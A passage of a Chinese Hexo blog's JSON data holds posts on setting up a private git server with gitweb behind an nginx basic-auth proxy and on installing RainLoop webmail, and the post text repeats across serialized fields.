<strong>/var/www/git</strong> 下放置cgi程序和仓库代码，但我们把仓库安装在了 <strong>/srv/git</strong> 下，所以做个软链接<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># ln -s /srv/git /var/www/git</span><br><span class=\"line\"># yum install gitweb</span><br><span class=\"line\"># ls /var/www/git</span><br><span class=\"line\">gitweb.cgi static PROJECT.git</span><br></pre></td></tr></table></figure></p>\n<p>可以看到yum安装后多出了这两个: <strong>gitweb.cgi static</strong></p>\n<h4 id=\"接下来启动gitweb服务\"><a href=\"#接下来启动gitweb服务\" class=\"headerlink\" title=\"接下来启动gitweb服务\"></a>接下来启动gitweb服务</h4><p>刚才安装的gitweb只是一套动态程序，HTTP访问还要借助lighttpd apache等web服务器．而git自带的命令instaweb可以自动创建web服务器的配置文件．指定–httpd参数为lighttpd即可<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># sudo -i</span><br><span class=\"line\"># cd /var/www/git</span><br><span class=\"line\"># git init</span><br><span class=\"line\"></span><br><span class=\"line\"># yum install lighttpd</span><br><span class=\"line\"># git instaweb --httpd=lighttpd --port=1234</span><br><span class=\"line\">No known browser available.</span><br><span class=\"line\">http://127.0.0.1:1234</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"上面的命令解释\"><a href=\"#上面的命令解释\" class=\"headerlink\" title=\"上面的命令解释:\"></a>上面的命令解释:</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># sudo -i</span><br><span class=\"line\"># cd /var/www/git</span><br></pre></td></tr></table></figure>\n<p>因为 /var/www/git 是git用户的home目录，因此普通用户可能没有权限cd，所以需要-i参数保持root权限.</p>\n<p>注意：git instaweb 不能指定document root目录，所以在哪个目录下执行，就展示那个目录下的仓库．因而需要先<strong>cd</strong>到这里<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># git init</span><br></pre></td></tr></table></figure></p>\n<p>git instaweb创建的web服务器配置文件，需要一个git仓库来存放．</p>\n<h4 id=\"外界访问控制\"><a href=\"#外界访问控制\" class=\"headerlink\" title=\"外界访问控制\"></a>外界访问控制</h4><p>到这里就可以访问git仓库了，但没有完，还需要外界可以访问，并且要限制访问．这时可以借助nginx，或者修改lighttpd的配置文件<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">server &#123;</span><br><span class=\"line\">    listen 80;</span><br><span class=\"line\">    server_name git.MYHOST.COM</span><br><span class=\"line\">    location / &#123;</span><br><span class=\"line\">        auth_basic &quot;git web require auth&quot;;</span><br><span class=\"line\">        auth_basic_user_file /srv/etc/passwd;</span><br><span class=\"line\">        proxy_pass http://127.0.0.1:1234/;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>有关auth_basic的配置可以参阅 <a href=\"http://nginx.org/en/docs/http/ngx_http_auth_basic_module.html\" target=\"_blank\" rel=\"noopener\">http://nginx.org/en/docs/http/ngx_http_auth_basic_module.html</a></p>\n<h4 id=\"大功告成\"><a href=\"#大功告成\" class=\"headerlink\" title=\"大功告成\"></a>大功告成</h4><p>到这一步就结束了，现在访问 <a href=\"http://git.MYHOST.COM/\" target=\"_blank\" rel=\"noopener\">http://git.MYHOST.COM/</a> 即可浏览仓库信息</p>\n<p>如果你觉得这个web界面太丑陋的话，可以看看 <a href=\"https://github.com/kogakure/gitweb-theme\" target=\"_blank\" rel=\"noopener\">https://github.com/kogakure/gitweb-theme</a> ，这个项目提供了更优雅的主题界面：<a href=\"http://kogakure.github.io/gitweb-theme/\" target=\"_blank\" rel=\"noopener\">http://kogakure.github.io/gitweb-theme/</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p>github私有仓库的费用太贵，有VPS可以自己搭建一个专属git服务器</p>\n<p>其实没什么需要安装的，git的默认协议SSH不需要什么配置，主要是方便和安全方面的优化</p>\n<h2 id=\"初始化环境\"><a href=\"#初始化环境\" class=\"headerlink\" title=\"初始化环境\"></a>初始化环境</h2><p>为了安全，我们为git仓库专门设置一个管理用户<strong>git</strong>，约定使用 <strong>/srv/git</strong> 放置仓库<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ sudo useradd \\</span><br><span class=\"line\">--create-home \\</span><br><span class=\"line\">--home-dir=/srv/git \\</span><br><span class=\"line\">--root=/srv/git \\</span><br><span class=\"line\">--base-dir=/srv/git \\</span><br><span class=\"line\">--shell=/usr/bin/git-shell \\</span><br><span class=\"line\">git</span><br><span class=\"line\">$ sudo passwd git</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"上面的参数作用\"><a href=\"#上面的参数作用\" class=\"headerlink\" title=\"上面的参数作用\"></a>上面的参数作用</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">--create-home --home-dir=/srv/git</span><br></pre></td></tr></table></figure>\n<p>创建用户主目录，将来可以添加SSH KEY登录方式，和代码仓库放在一起方便管理<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">--root=/srv/git</span><br></pre></td></tr></table></figure></p>\n<p>限制这个用户的访问目录在/srv/git，不能访问其它路径，这是出于安全考虑<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">--base-dir=/srv/git</span><br></pre></td></tr></table></figure></p>\n<p>用户base目录，即默认的父目录．帮助简化了克隆时的目录前缀<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">--shell=/usr/bin/git-shell</span><br></pre></td></tr></table></figure></p>\n<p>只允许用户用于管理仓库，不得执行其它命令</p>\n<h2 id=\"创建仓库\"><a href=\"#创建仓库\" class=\"headerlink\" title=\"创建仓库\"></a>创建仓库</h2><p>初始化一个裸仓库，即只包含仓库信息，不包含代码<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ sudo git --bare init /srv/git/MY_PROJECT.git</span><br></pre></td></tr></table></figure></p>\n<p>不需要其它配置了，就这么简单</p>\n<h2 id=\"从客户端克隆\"><a href=\"#从客户端克隆\" class=\"headerlink\" title=\"从客户端克隆\"></a>从客户端克隆</h2><p>MYHOST就是VPS的主机地址<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ git clone git@MYHOST:MY_PROJECT.git</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"主机名后的目录只需要填写仓库目录\"><a href=\"#主机名后的目录只需要填写仓库目录\" class=\"headerlink\" title=\"主机名后的目录只需要填写仓库目录\"></a>主机名后的目录只需要填写仓库目录</h4><p>这是创建用户时指定的 <strong>–base-dir</strong> 立的功，让你不用输入完整的目录 <strong>/srv/git/MY_PROJECT.git</strong></p>\n<h4 id=\"尝试用git用户登录会被阻止\"><a href=\"#尝试用git用户登录会被阻止\" class=\"headerlink\" title=\"尝试用git用户登录会被阻止\"></a>尝试用git用户登录会被阻止</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ ssh git@MYHOST</span><br><span class=\"line\">git@MYHOST&apos;s password:</span><br><span class=\"line\">fatal: Interactive git shell is not enabled.hint: ~/git-shell-commands should exist and have read and execute access.</span><br><span class=\"line\">Connection to MYHOST closed.</span><br></pre></td></tr></table></figure>\n<h2 id=\"web界面\"><a href=\"#web界面\" class=\"headerlink\" title=\"web界面\"></a>web界面</h2><h4 id=\"首先安装gitweb软件包，它附带了访问仓库的cgi动态程序．\"><a href=\"#首先安装gitweb软件包，它附带了访问仓库的cgi动态程序．\" class=\"headerlink\" title=\"首先安装gitweb软件包，它附带了访问仓库的cgi动态程序．\"></a>首先安装gitweb软件包，它附带了访问仓库的cgi动态程序．</h4><p>gitweb默认需要在 <strong>/var/www/git</strong> 下放置cgi程序和仓库代码，但我们把仓库安装在了 <strong>/srv/git</strong> 下，所以做个软链接<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># ln -s /srv/git /var/www/git</span><br><span class=\"line\"># yum install gitweb</span><br><span class=\"line\"># ls /var/www/git</span><br><span class=\"line\">gitweb.cgi static PROJECT.git</span><br></pre></td></tr></table></figure></p>\n<p>可以看到yum安装后多出了这两个: <strong>gitweb.cgi static</strong></p>\n<h4 id=\"接下来启动gitweb服务\"><a href=\"#接下来启动gitweb服务\" class=\"headerlink\" title=\"接下来启动gitweb服务\"></a>接下来启动gitweb服务</h4><p>刚才安装的gitweb只是一套动态程序，HTTP访问还要借助lighttpd apache等web服务器．而git自带的命令instaweb可以自动创建web服务器的配置文件．指定–httpd参数为lighttpd即可<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># sudo -i</span><br><span class=\"line\"># cd /var/www/git</span><br><span class=\"line\"># git init</span><br><span class=\"line\"></span><br><span class=\"line\"># yum install lighttpd</span><br><span class=\"line\"># git instaweb --httpd=lighttpd --port=1234</span><br><span class=\"line\">No known browser available.</span><br><span class=\"line\">http://127.0.0.1:1234</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"上面的命令解释\"><a href=\"#上面的命令解释\" class=\"headerlink\" title=\"上面的命令解释:\"></a>上面的命令解释:</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># sudo -i</span><br><span class=\"line\"># cd /var/www/git</span><br></pre></td></tr></table></figure>\n<p>因为 /var/www/git 是git用户的home目录，因此普通用户可能没有权限cd，所以需要-i参数保持root权限.</p>\n<p>注意：git instaweb 不能指定document root目录，所以在哪个目录下执行，就展示那个目录下的仓库．因而需要先<strong>cd</strong>到这里<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># git init</span><br></pre></td></tr></table></figure></p>\n<p>git instaweb创建的web服务器配置文件，需要一个git仓库来存放．</p>\n<h4 id=\"外界访问控制\"><a href=\"#外界访问控制\" class=\"headerlink\" title=\"外界访问控制\"></a>外界访问控制</h4><p>到这里就可以访问git仓库了，但没有完，还需要外界可以访问，并且要限制访问．这时可以借助nginx，或者修改lighttpd的配置文件<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">server &#123;</span><br><span class=\"line\">    listen 80;</span><br><span class=\"line\">    server_name git.MYHOST.COM</span><br><span class=\"line\">    location / &#123;</span><br><span class=\"line\">        auth_basic &quot;git web require auth&quot;;</span><br><span class=\"line\">        auth_basic_user_file /srv/etc/passwd;</span><br><span class=\"line\">        proxy_pass http://127.0.0.1:1234/;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>有关auth_basic的配置可以参阅 <a href=\"http://nginx.org/en/docs/http/ngx_http_auth_basic_module.html\" target=\"_blank\" rel=\"noopener\">http://nginx.org/en/docs/http/ngx_http_auth_basic_module.html</a></p>\n<h4 id=\"大功告成\"><a href=\"#大功告成\" class=\"headerlink\" title=\"大功告成\"></a>大功告成</h4><p>到这一步就结束了，现在访问 <a href=\"http://git.MYHOST.COM/\" target=\"_blank\" rel=\"noopener\">http://git.MYHOST.COM/</a> 即可浏览仓库信息</p>\n<p>如果你觉得这个web界面太丑陋的话，可以看看 <a href=\"https://github.com/kogakure/gitweb-theme\" target=\"_blank\" rel=\"noopener\">https://github.com/kogakure/gitweb-theme</a> ，这个项目提供了更优雅的主题界面：<a href=\"http://kogakure.github.io/gitweb-theme/\" target=\"_blank\" rel=\"noopener\">http://kogakure.github.io/gitweb-theme/</a></p>\n"},{"title":"搭建自己的web邮件管理","id":"61","date":"2015-06-06T07:09:47.000Z","_content":"\n当搭建了自己的邮件服务器后，还需要发送和管理邮件的服务．客户端foxmail提供了这样的服务，而浏览器端可以使用Rainloop-webmail开源软件．\n\n### 项目地址\n\n##### 官网\n\n[http://www.rainloop.net/](http://www.rainloop.net/)\n\n##### github\n\n[https://github.com/RainLoop/rainloop-webmail](https://github.com/RainLoop/rainloop-webmail)\n\n##### 界面截屏\n\nhttp://www.rainloop.net/screenshots/\n\n### 特点介绍\n\n*   支持多语言，包括中文的完整支持\n*   基于PHP5.3+，满足大部分主机\n*   不需要数据库（使用联系人功能才需要数据库）\n*   内置多种主题，界面美观\n\n### 系统需求\n\n> **Web server: **[Apache](http://httpd.apache.org/), [nginx](http://nginx.org/), [lighttpd](http://www.lighttpd.net/), [MS IIS](http://www.iis.net/) or other with PHP support\r> \n> \n> **PHP:** 5.3 and above\r> \n> \n> **PHP extensions: **[cURL](http://php.net/manual/en/book.curl.php), [iconv](http://php.net/manual/en/book.iconv.php), [json](http://php.net/manual/en/book.json.php), [libxml](http://php.net/manual/en/book.libxml.php), [dom](http://php.net/manual/en/book.dom.php), [openssl](http://php.net/manual/en/book.openssl.php), [DateTime](http://php.net/manual/en/book.datetime.php), [PCRE](http://php.net/manual/en/book.pcre.php), [SPL](http://php.net/manual/en/book.spl.php)\r> \n> \n> **Browser: **[Internet Explorer 9+](http://windows.microsoft.com/en-US/internet-explorer/download-ie), [Firefox](http://www.mozilla-europe.org/), [Opera 10+](http://www.opera.com/), [Safari 3+](http://www.apple.com/safari/), [Google Chrome](http://www.google.com/chrome/)\r> \n> \n> **Optional: **[PDO](http://php.net/manual/en/book.pdo.php) ([MySQL](http://php.net/manual/en/ref.pdo-mysql.php)/[PostgreSQL](http://php.net/manual/en/ref.pdo-pgsql.php)/[SQLite](http://php.net/manual/en/ref.pdo-sqlite.php)) PHP extension (for contacts)\nPHP的扩展，除了openssl，curl安装时需要特别指定 `--with-openssl``--with-curl` ,其余扩展都是默认安装的．\n\n&nbsp;\n\n## 搭建\n\n##### 安装文档\n\nhttp://www.rainloop.net/docs/installation/\n\n##### 特别注意\n\n###### 创建数据目录\n\n需要在安装目录外创建一个data目录，web服务可读写权限．这个目录包含了许多关键信息，需要配置禁止访问\n```\nlocation ^~ /data {\n  deny all;\n}\n```\n\n###### 安装后配置\n\n首先需要访问 http://mail.example.com/?admin 配置允许的域名\n\n初始登录 admin 密码 12345 ,登录后先改掉admin密码\n\n然后进入 domains 页面: /?/admin#/domains  将你的邮箱域名添加到列表里.然后才能用这个邮箱地址登录\n\n###### 更换语言\n\n进入general页面: /?/admin#/general 前台界面支持中文,后台界面不支持\n\n###### 登录\n\n用完整的邮箱密码登录即可，如果不想每次输入邮箱的域名，可以在后台域名管理设置为其默认域名．点击域名列表里的域名,勾选 Use short login\n\n这样就可以只输入邮箱@前的用户名","source":"_posts/e6-90-ad-e5-bb-ba-e8-87-aa-e5-b7-b1-e7-9a-84web-e9-82-ae-e4-bb-b6-e7-ae-a1-e7-90-86.md","raw":"---\ntitle: 搭建自己的web邮件管理\nid: 61\ncategories:\n  - linux\ndate: 2015-06-06 15:09:47\ntags:\n---\n\n当搭建了自己的邮件服务器后，还需要发送和管理邮件的服务．客户端foxmail提供了这样的服务，而浏览器端可以使用Rainloop-webmail开源软件．\n\n### 项目地址\n\n##### 官网\n\n[http://www.rainloop.net/](http://www.rainloop.net/)\n\n##### github\n\n[https://github.com/RainLoop/rainloop-webmail](https://github.com/RainLoop/rainloop-webmail)\n\n##### 界面截屏\n\nhttp://www.rainloop.net/screenshots/\n\n### 特点介绍\n\n*   支持多语言，包括中文的完整支持\n*   基于PHP5.3+，满足大部分主机\n*   不需要数据库（使用联系人功能才需要数据库）\n*   内置多种主题，界面美观\n\n### 系统需求\n\n> **Web server: **[Apache](http://httpd.apache.org/), [nginx](http://nginx.org/), [lighttpd](http://www.lighttpd.net/), [MS IIS](http://www.iis.net/) or other with PHP support\r> \n> \n> **PHP:** 5.3 and above\r> \n> \n> **PHP extensions: **[cURL](http://php.net/manual/en/book.curl.php), [iconv](http://php.net/manual/en/book.iconv.php), [json](http://php.net/manual/en/book.json.php), [libxml](http://php.net/manual/en/book.libxml.php), [dom](http://php.net/manual/en/book.dom.php), [openssl](http://php.net/manual/en/book.openssl.php), [DateTime](http://php.net/manual/en/book.datetime.php), [PCRE](http://php.net/manual/en/book.pcre.php), [SPL](http://php.net/manual/en/book.spl.php)\r> \n> \n> **Browser: **[Internet Explorer 9+](http://windows.microsoft.com/en-US/internet-explorer/download-ie), [Firefox](http://www.mozilla-europe.org/), [Opera 10+](http://www.opera.com/), [Safari 3+](http://www.apple.com/safari/), [Google Chrome](http://www.google.com/chrome/)\r> \n> \n> **Optional: **[PDO](http://php.net/manual/en/book.pdo.php) ([MySQL](http://php.net/manual/en/ref.pdo-mysql.php)/[PostgreSQL](http://php.net/manual/en/ref.pdo-pgsql.php)/[SQLite](http://php.net/manual/en/ref.pdo-sqlite.php)) PHP extension (for contacts)\nPHP的扩展，除了openssl，curl安装时需要特别指定 `--with-openssl``--with-curl` ,其余扩展都是默认安装的．\n\n&nbsp;\n\n## 搭建\n\n##### 安装文档\n\nhttp://www.rainloop.net/docs/installation/\n\n##### 特别注意\n\n###### 创建数据目录\n\n需要在安装目录外创建一个data目录，web服务可读写权限．这个目录包含了许多关键信息，需要配置禁止访问\n```\nlocation ^~ /data {\n  deny all;\n}\n```\n\n###### 安装后配置\n\n首先需要访问 http://mail.example.com/?admin 配置允许的域名\n\n初始登录 admin 密码 12345 ,登录后先改掉admin密码\n\n然后进入 domains 页面: /?/admin#/domains  将你的邮箱域名添加到列表里.然后才能用这个邮箱地址登录\n\n###### 更换语言\n\n进入general页面: /?/admin#/general 前台界面支持中文,后台界面不支持\n\n###### 登录\n\n用完整的邮箱密码登录即可，如果不想每次输入邮箱的域名，可以在后台域名管理设置为其默认域名．点击域名列表里的域名,勾选 Use short login\n\n这样就可以只输入邮箱@前的用户名","slug":"e6-90-ad-e5-bb-ba-e8-87-aa-e5-b7-b1-e7-9a-84web-e9-82-ae-e4-bb-b6-e7-ae-a1-e7-90-86","published":1,"updated":"2018-03-05T12:55:52.925Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjef4yhvd0015lzlm3k0mjqna","content":"<p>当搭建了自己的邮件服务器后，还需要发送和管理邮件的服务．客户端foxmail提供了这样的服务，而浏览器端可以使用Rainloop-webmail开源软件．</p>\n<h3 id=\"项目地址\"><a href=\"#项目地址\" class=\"headerlink\" title=\"项目地址\"></a>项目地址</h3><h5 id=\"官网\"><a href=\"#官网\" class=\"headerlink\" title=\"官网\"></a>官网</h5><p><a href=\"http://www.rainloop.net/\" target=\"_blank\" rel=\"noopener\">http://www.rainloop.net/</a></p>\n<h5 id=\"github\"><a href=\"#github\" class=\"headerlink\" title=\"github\"></a>github</h5><p><a href=\"https://github.com/RainLoop/rainloop-webmail\" target=\"_blank\" rel=\"noopener\">https://github.com/RainLoop/rainloop-webmail</a></p>\n<h5 id=\"界面截屏\"><a href=\"#界面截屏\" class=\"headerlink\" title=\"界面截屏\"></a>界面截屏</h5><p><a href=\"http://www.rainloop.net/screenshots/\" target=\"_blank\" rel=\"noopener\">http://www.rainloop.net/screenshots/</a></p>\n<h3 id=\"特点介绍\"><a href=\"#特点介绍\" class=\"headerlink\" title=\"特点介绍\"></a>特点介绍</h3><ul>\n<li>支持多语言，包括中文的完整支持</li>\n<li>基于PHP5.3+，满足大部分主机</li>\n<li>不需要数据库（使用联系人功能才需要数据库）</li>\n<li>内置多种主题，界面美观</li>\n</ul>\n<h3 id=\"系统需求\"><a href=\"#系统需求\" class=\"headerlink\" title=\"系统需求\"></a>系统需求</h3><blockquote>\n<p><strong>Web server: </strong><a href=\"http://httpd.apache.org/\" target=\"_blank\" rel=\"noopener\">Apache</a>, <a href=\"http://nginx.org/\" target=\"_blank\" rel=\"noopener\">nginx</a>, <a href=\"http://www.lighttpd.net/\" target=\"_blank\" rel=\"noopener\">lighttpd</a>, <a href=\"http://www.iis.net/\" target=\"_blank\" rel=\"noopener\">MS IIS</a> or other with PHP support</p>\n<p><strong>PHP:</strong> 5.3 and above</p>\n<p><strong>PHP extensions: </strong><a href=\"http://php.net/manual/en/book.curl.php\" target=\"_blank\" rel=\"noopener\">cURL</a>, <a href=\"http://php.net/manual/en/book.iconv.php\" target=\"_blank\" rel=\"noopener\">iconv</a>, <a href=\"http://php.net/manual/en/book.json.php\" target=\"_blank\" rel=\"noopener\">json</a>, <a href=\"http://php.net/manual/en/book.libxml.php\" target=\"_blank\" rel=\"noopener\">libxml</a>, <a href=\"http://php.net/manual/en/book.dom.php\" target=\"_blank\" rel=\"noopener\">dom</a>, <a href=\"http://php.net/manual/en/book.openssl.php\" target=\"_blank\" rel=\"noopener\">openssl</a>, <a href=\"http://php.net/manual/en/book.datetime.php\" target=\"_blank\" rel=\"noopener\">DateTime</a>, <a href=\"http://php.net/manual/en/book.pcre.php\" target=\"_blank\" rel=\"noopener\">PCRE</a>, <a href=\"http://php.net/manual/en/book.spl.php\" target=\"_blank\" rel=\"noopener\">SPL</a></p>\n<p><strong>Browser: </strong><a href=\"http://windows.microsoft.com/en-US/internet-explorer/download-ie\" target=\"_blank\" rel=\"noopener\">Internet Explorer 9+</a>, <a href=\"http://www.mozilla-europe.org/\" target=\"_blank\" rel=\"noopener\">Firefox</a>, <a href=\"http://www.opera.com/\" target=\"_blank\" rel=\"noopener\">Opera 10+</a>, <a href=\"http://www.apple.com/safari/\" target=\"_blank\" rel=\"noopener\">Safari 3+</a>, <a href=\"http://www.google.com/chrome/\" target=\"_blank\" rel=\"noopener\">Google Chrome</a></p>\n<p><strong>Optional: </strong><a href=\"http://php.net/manual/en/book.pdo.php\" target=\"_blank\" rel=\"noopener\">PDO</a> (<a href=\"http://php.net/manual/en/ref.pdo-mysql.php\" target=\"_blank\" rel=\"noopener\">MySQL</a>/<a href=\"http://php.net/manual/en/ref.pdo-pgsql.php\" target=\"_blank\" rel=\"noopener\">PostgreSQL</a>/<a href=\"http://php.net/manual/en/ref.pdo-sqlite.php\" target=\"_blank\" rel=\"noopener\">SQLite</a>) PHP extension (for contacts)<br>PHP的扩展，除了openssl，curl安装时需要特别指定 <code>--with-openssl`</code>–with-curl` ,其余扩展都是默认安装的．</p>\n</blockquote>\n<p>&nbsp;</p>\n<h2 id=\"搭建\"><a href=\"#搭建\" class=\"headerlink\" title=\"搭建\"></a>搭建</h2><h5 id=\"安装文档\"><a href=\"#安装文档\" class=\"headerlink\" title=\"安装文档\"></a>安装文档</h5><p><a href=\"http://www.rainloop.net/docs/installation/\" target=\"_blank\" rel=\"noopener\">http://www.rainloop.net/docs/installation/</a></p>\n<h5 id=\"特别注意\"><a href=\"#特别注意\" class=\"headerlink\" title=\"特别注意\"></a>特别注意</h5><h6 id=\"创建数据目录\"><a href=\"#创建数据目录\" class=\"headerlink\" title=\"创建数据目录\"></a>创建数据目录</h6><p>需要在安装目录外创建一个data目录，web服务可读写权限．这个目录包含了许多关键信息，需要配置禁止访问<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">location ^~ /data &#123;</span><br><span class=\"line\">  deny all;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h6 id=\"安装后配置\"><a href=\"#安装后配置\" class=\"headerlink\" title=\"安装后配置\"></a>安装后配置</h6><p>首先需要访问 <a href=\"http://mail.example.com/?admin\" target=\"_blank\" rel=\"noopener\">http://mail.example.com/?admin</a> 配置允许的域名</p>\n<p>初始登录 admin 密码 12345 ,登录后先改掉admin密码</p>\n<p>然后进入 domains 页面: /?/admin#/domains  将你的邮箱域名添加到列表里.然后才能用这个邮箱地址登录</p>\n<h6 id=\"更换语言\"><a href=\"#更换语言\" class=\"headerlink\" title=\"更换语言\"></a>更换语言</h6><p>进入general页面: /?/admin#/general 前台界面支持中文,后台界面不支持</p>\n<h6 id=\"登录\"><a href=\"#登录\" class=\"headerlink\" title=\"登录\"></a>登录</h6><p>用完整的邮箱密码登录即可，如果不想每次输入邮箱的域名，可以在后台域名管理设置为其默认域名．点击域名列表里的域名,勾选 Use short login</p>\n<p>这样就可以只输入邮箱@前的用户名</p>\n","site":{"data":{}},"excerpt":"","more":"<p>当搭建了自己的邮件服务器后，还需要发送和管理邮件的服务．客户端foxmail提供了这样的服务，而浏览器端可以使用Rainloop-webmail开源软件．</p>\n<h3 id=\"项目地址\"><a href=\"#项目地址\" class=\"headerlink\" title=\"项目地址\"></a>项目地址</h3><h5 id=\"官网\"><a href=\"#官网\" class=\"headerlink\" title=\"官网\"></a>官网</h5><p><a href=\"http://www.rainloop.net/\" target=\"_blank\" rel=\"noopener\">http://www.rainloop.net/</a></p>\n<h5 id=\"github\"><a href=\"#github\" class=\"headerlink\" title=\"github\"></a>github</h5><p><a href=\"https://github.com/RainLoop/rainloop-webmail\" target=\"_blank\" rel=\"noopener\">https://github.com/RainLoop/rainloop-webmail</a></p>\n<h5 id=\"界面截屏\"><a href=\"#界面截屏\" class=\"headerlink\" title=\"界面截屏\"></a>界面截屏</h5><p><a href=\"http://www.rainloop.net/screenshots/\" target=\"_blank\" rel=\"noopener\">http://www.rainloop.net/screenshots/</a></p>\n<h3 id=\"特点介绍\"><a href=\"#特点介绍\" class=\"headerlink\" title=\"特点介绍\"></a>特点介绍</h3><ul>\n<li>支持多语言，包括中文的完整支持</li>\n<li>基于PHP5.3+，满足大部分主机</li>\n<li>不需要数据库（使用联系人功能才需要数据库）</li>\n<li>内置多种主题，界面美观</li>\n</ul>\n<h3 id=\"系统需求\"><a href=\"#系统需求\" class=\"headerlink\" title=\"系统需求\"></a>系统需求</h3><blockquote>\n<p><strong>Web server: </strong><a href=\"http://httpd.apache.org/\" target=\"_blank\" rel=\"noopener\">Apache</a>, <a href=\"http://nginx.org/\" target=\"_blank\" rel=\"noopener\">nginx</a>, <a href=\"http://www.lighttpd.net/\" target=\"_blank\" rel=\"noopener\">lighttpd</a>, <a href=\"http://www.iis.net/\" target=\"_blank\" rel=\"noopener\">MS IIS</a> or other with PHP support</p>\n<p><strong>PHP:</strong> 5.3 and above</p>\n<p><strong>PHP extensions: </strong><a href=\"http://php.net/manual/en/book.curl.php\" target=\"_blank\" rel=\"noopener\">cURL</a>, <a href=\"http://php.net/manual/en/book.iconv.php\" target=\"_blank\" rel=\"noopener\">iconv</a>, <a href=\"http://php.net/manual/en/book.json.php\" target=\"_blank\" rel=\"noopener\">json</a>, <a href=\"http://php.net/manual/en/book.libxml.php\" target=\"_blank\" rel=\"noopener\">libxml</a>, <a href=\"http://php.net/manual/en/book.dom.php\" target=\"_blank\" rel=\"noopener\">dom</a>, <a href=\"http://php.net/manual/en/book.openssl.php\" target=\"_blank\" rel=\"noopener\">openssl</a>, <a href=\"http://php.net/manual/en/book.datetime.php\" target=\"_blank\" rel=\"noopener\">DateTime</a>, <a href=\"http://php.net/manual/en/book.pcre.php\" target=\"_blank\" rel=\"noopener\">PCRE</a>, <a href=\"http://php.net/manual/en/book.spl.php\" target=\"_blank\" rel=\"noopener\">SPL</a></p>\n<p><strong>Browser: </strong><a href=\"http://windows.microsoft.com/en-US/internet-explorer/download-ie\" target=\"_blank\" rel=\"noopener\">Internet Explorer 9+</a>, <a href=\"http://www.mozilla-europe.org/\" target=\"_blank\" rel=\"noopener\">Firefox</a>, <a href=\"http://www.opera.com/\" target=\"_blank\" rel=\"noopener\">Opera 10+</a>, <a href=\"http://www.apple.com/safari/\" target=\"_blank\" 